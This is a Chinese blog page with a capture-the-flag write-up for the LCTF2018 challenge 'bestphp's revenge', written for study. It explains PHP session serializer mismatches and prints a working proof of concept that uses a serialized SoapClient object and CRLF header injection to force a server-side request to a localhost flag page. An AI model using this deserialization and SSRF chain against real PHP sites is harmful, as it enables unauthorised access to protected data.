@@ -1,0 +1,808 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Write UP,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="LCTF2018-bestphp’s revenge源码： 123456789101112&amp;lt;?phphighlight_file(__FILE__);$b = &apos;implode&apos;;call_user_func($_GET[f],$_POST);session_start();if(isset($_GET[name]))&amp;#123;    $_SESSION[name] = $_GET[nam">
+<meta name="keywords" content="Write UP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LCTF2018-bestphp&#39;s revenge">
+<meta property="og:url" content="http://yoursite.com/2019/10/07/LCTF2018_bestphp's_revenge/index.html">
+<meta property="og:site_name" content="V&#39;s blog">
+<meta property="og:description" content="LCTF2018-bestphp’s revenge源码： 123456789101112&amp;lt;?phphighlight_file(__FILE__);$b = &apos;implode&apos;;call_user_func($_GET[f],$_POST);session_start();if(isset($_GET[name]))&amp;#123;    $_SESSION[name] = $_GET[nam">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://ask.qcloudimg.com/http-save/yehe-1291653/mp8dvsh9ju.jpeg?imageView2/2/w/1620">
+<meta property="og:image" content="https://ask.qcloudimg.com/http-save/yehe-1291653/f9l78k32tl.jpeg?imageView2/2/w/1620">
+<meta property="og:image" content="https://ask.qcloudimg.com/http-save/yehe-1291653/rv3awdxox1.jpeg?imageView2/2/w/1620">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/1270588/201909/1270588-20190912225652245-1141552362.png">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/1270588/201909/1270588-20190912225701518-432338964.png">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/1270588/201909/1270588-20190912225714209-244858227.png">
+<meta property="og:updated_time" content="2019-10-07T15:01:26.658Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="LCTF2018-bestphp&#39;s revenge">
+<meta name="twitter:description" content="LCTF2018-bestphp’s revenge源码： 123456789101112&amp;lt;?phphighlight_file(__FILE__);$b = &apos;implode&apos;;call_user_func($_GET[f],$_POST);session_start();if(isset($_GET[name]))&amp;#123;    $_SESSION[name] = $_GET[nam">
+<meta name="twitter:image" content="https://ask.qcloudimg.com/http-save/yehe-1291653/mp8dvsh9ju.jpeg?imageView2/2/w/1620">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/10/07/LCTF2018_bestphp's_revenge/">
+
+
+
+
+
+  <title>LCTF2018-bestphp's revenge | V's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">V's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Daily life of a rookie</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/07/LCTF2018_bestphp's_revenge/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="V">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="V's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">LCTF2018-bestphp's revenge</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-07T23:01:00+08:00">
+                2019-10-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="LCTF2018-bestphp’s-revenge"><a href="#LCTF2018-bestphp’s-revenge" class="headerlink" title="LCTF2018-bestphp’s revenge"></a>LCTF2018-bestphp’s revenge</h1><p>源码：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">$b = <span class="string">'implode'</span>;</span></span><br><span class="line"><span class="php">call_user_func($_GET[f],$_POST);</span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[name]))&#123;</span></span><br><span class="line"><span class="php">    $_SESSION[name] = $_GET[name];</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">var_dump($_SESSION);</span></span><br><span class="line"><span class="php">$a = <span class="keyword">array</span>(reset($_SESSION),<span class="string">'welcome_to_the_lctf2018'</span>);</span></span><br><span class="line"><span class="php">call_user_func($b,$a);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>flag.php</p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">session_start();</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'only localhost can get flag!'</span>;</span><br><span class="line">$<span class="built_in">flag</span> = <span class="string">'LCTF&#123;*************************&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>($<span class="variable">_SERVER</span>[<span class="string">"REMOTE_ADDR"</span>]===<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">       $<span class="variable">_SESSION</span>[<span class="string">'flag'</span>] = $<span class="built_in">flag</span>;</span><br><span class="line">   &#125;</span><br><span class="line">only localhost can get <span class="built_in">flag</span>!</span><br></pre></td></tr></table></figure>
+
+<p>参考wp：<a href="https://cloud.tencent.com/developer/article/1376384" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1376384</a></p>
+<p>题目给了hint：反序列化。<br>题目中并没有反序列化函数，由于session文件内容的格式不好控制，也无法利用phar://进行反序列化，那么基本就可以确定题目与PHP中SESSION的反序列化机制有关。</p>
+<p>利用回调函数调用session_start函数，修改session的位置，再配合LFI进行getshell。</p>
+<p>php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。 存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列话之后的内容。 在php.ini中存在三项配置项：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">session.save_path=<span class="string">""</span>   --设置session的存储路径</span><br><span class="line">session.save_handler=<span class="string">""</span> --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</span><br><span class="line">session.serialize_handler   string --定义用来序列化/反序列化的处理器名字。默认是php(<span class="number">5.5</span><span class="number">.4</span>后改为php_serialize)</span><br></pre></td></tr></table></figure>
+
+<p>session.serialize_handler存在以下几种</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_binary 键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值</span><br><span class="line">php 键名+竖线（|）+经过serialize()函数处理过的值</span><br><span class="line">php_serialize 经过serialize()函数处理过的值，会将键名和值当作一个数组序列化</span><br></pre></td></tr></table></figure>
+
+<p>在PHP中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码ini_set(‘session.serialize_handler’, ‘需要设置的引擎’);。</p>
+<h3 id="php-binary引擎格式"><a href="#php-binary引擎格式" class="headerlink" title="php_binary引擎格式"></a>php_binary引擎格式</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="number">0x04</span>&gt;names:<span class="number">5</span>:<span class="string">"Smi1e"</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ask.qcloudimg.com/http-save/yehe-1291653/mp8dvsh9ju.jpeg?imageView2/2/w/1620" alt="img"></p>
+<h3 id="php引擎格式"><a href="#php引擎格式" class="headerlink" title="php引擎格式"></a>php引擎格式</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name|s:<span class="number">5</span>:<span class="string">"Smi1e"</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ask.qcloudimg.com/http-save/yehe-1291653/f9l78k32tl.jpeg?imageView2/2/w/1620" alt="img"></p>
+<h3 id="php-searialize引擎格式"><a href="#php-searialize引擎格式" class="headerlink" title="php_searialize引擎格式"></a>php_searialize引擎格式</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;<span class="attr">s</span>:<span class="number">4</span>:<span class="string">"name"</span>;s:<span class="number">5</span>:<span class="string">"Smi1e"</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ask.qcloudimg.com/http-save/yehe-1291653/rv3awdxox1.jpeg?imageView2/2/w/1620" alt="img"></p>
+<p>当序列化的引擎和反序列化的引擎不一致时，就可以利用引擎之间的差异产生序列化注入漏洞。<br>例如传入<code>$_SESSION[&#39;name&#39;]=&#39;|O:5:&quot;Smi1e&quot;:1:{s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;}&#39;;</code><br>序列化引擎使用的是php_serialize，那么储存的session文件为</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;<span class="attr">s</span>:<span class="number">4</span>:<span class="string">"name"</span>;s:<span class="number">5</span>:<span class="string">"|O:5:"</span>Smi1e<span class="string">":1:&#123;s:4:"</span>test<span class="string">";s:3:"</span>AAA<span class="string">";&#125;"</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而反序列化引擎如果使用的是php，就会把<code>|</code>作为作为key和value的分隔符。把<code>a:1:{s:4:&quot;name&quot;;s:5:&quot;</code>当作键名，而把<code>O:5:&quot;Smi1e&quot;:1:{s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;}</code>当作经过serialize()函数处理过的值，最后会把它进行unserialize处理，此时就构成了一次反序列化注入攻击</p>
+<p>利用思路：</p>
+<p>利用回调函数覆盖session序列化引擎为php_serilaze，构造SSRF的Soap类的序列化字符串配合序列化注入写入session文件，然后利用变量覆盖漏洞，覆盖掉变量b为回调函数call_user_func，此时结合我刚开始所说的回调函数调用Soap类的未知方法，触发__call方法进行SSRF访问flag.php。把flag写入session，再把session打印出来即可。</p>
+<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a><strong>解题</strong></h3><p>构造SSRF的Soap类的序列化字符串</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target = <span class="string">"http://127.0.0.1/flag.php"</span>;</span><br><span class="line">$attack = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,array(<span class="string">'location'</span> =&gt; $target,</span><br><span class="line">    <span class="string">'user_agent'</span> =&gt; <span class="string">"N0rth3ty\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\r\n"</span>,</span><br><span class="line">    <span class="string">'uri'</span> =&gt; <span class="string">"123"</span>));</span><br><span class="line">$payload = urlencode(serialize($attack));</span><br><span class="line">echo <span class="string">"|"</span>.$payload;</span><br></pre></td></tr></table></figure>
+
+<p>这里又涉及到crlf，参考<a href="https://www.jianshu.com/p/d4c304dbd0af" target="_blank" rel="noopener">[转载]CRLF Injection漏洞的利用与实例分析</a>，我的理解是因为http请求遇到两个<code>\r\n</code>即<code>%0d%0a</code>，会将前半部分当做头部解析，而将剩下的部分当做体，那么如果头部可控，就可以注入crlf实现修改http请求包。如果我的理解有错，请大佬指正。</p>
+<p>这个poc就是利用crlf伪造请求去访问flag.php并将结果保存在cookie为<code>PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4</code>的session中。</p>
+<p>此时session_start()序列化使用的是php引擎。接下里我们覆盖变量b，</p>
+<p>这里要知道<code>call_user_func()</code>函数如果传入的参数是<code>array</code>类型的话，会将数组的成员当做类名和方法，例如本题中可以先用<code>extract()</code>将b覆盖成<code>call_user_func()</code>，<code>reset($_SESSION)</code>就是<code>$_SESSION[&#39;name&#39;]</code>，我们可以传入<code>name=SoapClient</code>，那么最后<code>call_user_func($b, $a)</code>就变成<code>call_user_func(array(&#39;SoapClient&#39;,&#39;welcome_to_the_lctf2018&#39;))</code>,即<code>call_user_func(SoapClient-&gt;welcome_to_the_lctf2018)</code>，由于<code>SoapClient</code>类中没有<code>welcome_to_the_lctf2018</code>这个方法，就会调用魔术方法<code>__get()</code>从而发送请求</p>
+<h4 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h4><p>先注入poc得到的session<br><img src="https://img2018.cnblogs.com/blog/1270588/201909/1270588-20190912225652245-1141552362.png" alt="img"></p>
+<p>触发反序列化使SoapClient发送请求<br><img src="https://img2018.cnblogs.com/blog/1270588/201909/1270588-20190912225701518-432338964.png" alt="img"></p>
+<p>携带poc中的cookie访问即可得到flag<br><img src="https://img2018.cnblogs.com/blog/1270588/201909/1270588-20190912225714209-244858227.png" alt="img"></p>
+<h2 id="理解-amp-疑惑："><a href="#理解-amp-疑惑：" class="headerlink" title="理解&amp;疑惑："></a>理解&amp;疑惑：</h2><p>上面的wp是找来的，然后这里说说自己的理解叭。</p>
+<p>第一步，构造poc</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$target = <span class="string">"http://127.0.0.1/flag.php"</span>;</span></span><br><span class="line"><span class="php">$attack = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,</span></span><br><span class="line"><span class="php">    <span class="string">'user_agent'</span> =&gt; <span class="string">"N0rth3ty\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\r\n"</span>,</span></span><br><span class="line"><span class="php">    <span class="string">'uri'</span> =&gt; <span class="string">"123"</span>));</span></span><br><span class="line"><span class="php">$payload = urlencode(serialize($attack));</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"|"</span>.$payload;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后是f=session_start，serialize_handler=php_serialize 修改serialize引擎</p>
+<p>这样子存储为</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"name"</span>;<span class="attribute">s</span>:xx:<span class="string">"|$payload"</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后服务器反序列化时默认用的引擎是php</p>
+<p>就会把$payload赋值给a:1:{s:4:”name”;s:xx:”这一串玩意</p>
+<p>第二步，用<code>extract()</code>将b覆盖成<code>call_user_func()</code>，<code>reset($_SESSION)</code>就是<code>$_SESSION[&#39;name&#39;]</code>，我们可以传入<code>name=SoapClient</code>，那么最后<code>call_user_func($b, $a)</code>就变成<code>call_user_func(array(&#39;SoapClient&#39;,&#39;welcome_to_the_lctf2018&#39;))</code>,即<code>call_user_func(SoapClient-&gt;welcome_to_the_lctf2018)</code>，由于<code>SoapClient</code>类中没有<code>welcome_to_the_lctf2018</code>这个方法，就会调用魔术方法<code>__call()</code>，从而访问flag.php，把flag写入PHPSESSID为tcjr6nadpk3md7jbgioa6elfk4的session</p>
+<p>第三步，访问这个事件，查看$_SESSION即可得到flag。</p>
+<p>这里有个问题，虽然SoapClient这个方法是php原生类，但是具体的$target肯定是我们第一步写进去的，那么第一步是怎么写进去的呢？</p>
+<p>如果我们不用修改serialize引擎以达到注入的效果，又会怎样呢？</p>
+<p>直接name=$payload，那么存储为name|s:226:$paylaod；</p>
+<p>反序列化时只是单纯的给name赋值为$paylaod，$payload前面的s标志导致其反序列化为单纯的字符串</p>
+<p>而我们修改引擎后，存储为a:1:{s:4:”name”;s:xx:”|$payload”;}</p>
+<p>反序列化时，给a:1:{s:4:”name”;s:xx:”赋值为$payload，而此处的$payload会被反序列化为一个SoapClient对象，而这个对象里面的值被我们控制</p>
+<p>所以此处修改引擎的目的可以看作为，删除s:226这个标志，防止我们的$payload被反序列化为字符串</p>
+<p>最后是一个基础问题，啥时候反序列的，应该是在第二步，我们调用SoapClient类时，服务器反序列这个类，但这里似乎反序列化的是a:1:{s:4:”name”;s:xx:”这个键的键值，而不是原生的SoapClient类。</p>
+<h2 id="纠正："><a href="#纠正：" class="headerlink" title="纠正："></a>纠正：</h2><p>不是反序列了a:1:{s:4:”name”;s:xx:”这个键的键值，它的键值已经是个对象了，所以这之前应该已经反序列化了，所以应该也不是调用SoapClient类时，服务器才反序列这个类。</p>
+<p><strong>PHP内置了多种处理器用于存储$_SESSION数据时会对数据进行序列化和反序列化</strong></p>
+<p>回头看了这一句话，应该是，在程序运行完一次后，会将$_SESSION的值进行序列化存储进文件</p>
+<p>$_SESSION的值在被读取时，即session_start()时会对文件中​$_SESSION的数值进行一次反序列化读取。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Write-UP/" rel="tag"># Write UP</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/07/rsa套路笔记/" rel="next" title="RSA套路笔记">
+                <i class="fa fa-chevron-left"></i> RSA套路笔记
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2099/12/31/题目导航(手动置顶)/" rel="prev" title="题目导航(手动置顶)">
+                题目导航(手动置顶) <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="V">
+            
+              <p class="site-author-name" itemprop="name">V</p>
+              <p class="site-description motion-element" itemprop="description">It is not ignorance and weakness but arrogance that destroys mankind</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">23</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                blogroll
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://fzwjscj.top/" title="fzwjscj" target="_blank">fzwjscj</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://dldxz.cn/" title="DLDXZ" target="_blank">DLDXZ</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://fanda.cloud/" title="fanda" target="_blank">fanda</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://passingfoam.com/" title="PassingFoam's blog" target="_blank">PassingFoam's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://eqqie.cn/" title="eqqie's blog" target="_blank">eqqie's blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#LCTF2018-bestphp’s-revenge"><span class="nav-number">1.</span> <span class="nav-text">LCTF2018-bestphp’s revenge</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php-binary引擎格式"><span class="nav-number">1.0.1.</span> <span class="nav-text">php_binary引擎格式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php引擎格式"><span class="nav-number">1.0.2.</span> <span class="nav-text">php引擎格式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php-searialize引擎格式"><span class="nav-number">1.0.3.</span> <span class="nav-text">php_searialize引擎格式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题"><span class="nav-number">1.0.4.</span> <span class="nav-text">解题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#解题步骤"><span class="nav-number">1.0.4.1.</span> <span class="nav-text">解题步骤</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#理解-amp-疑惑："><span class="nav-number">1.1.</span> <span class="nav-text">理解&amp;疑惑：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#纠正："><span class="nav-number">1.2.</span> <span class="nav-text">纠正：</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">V</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
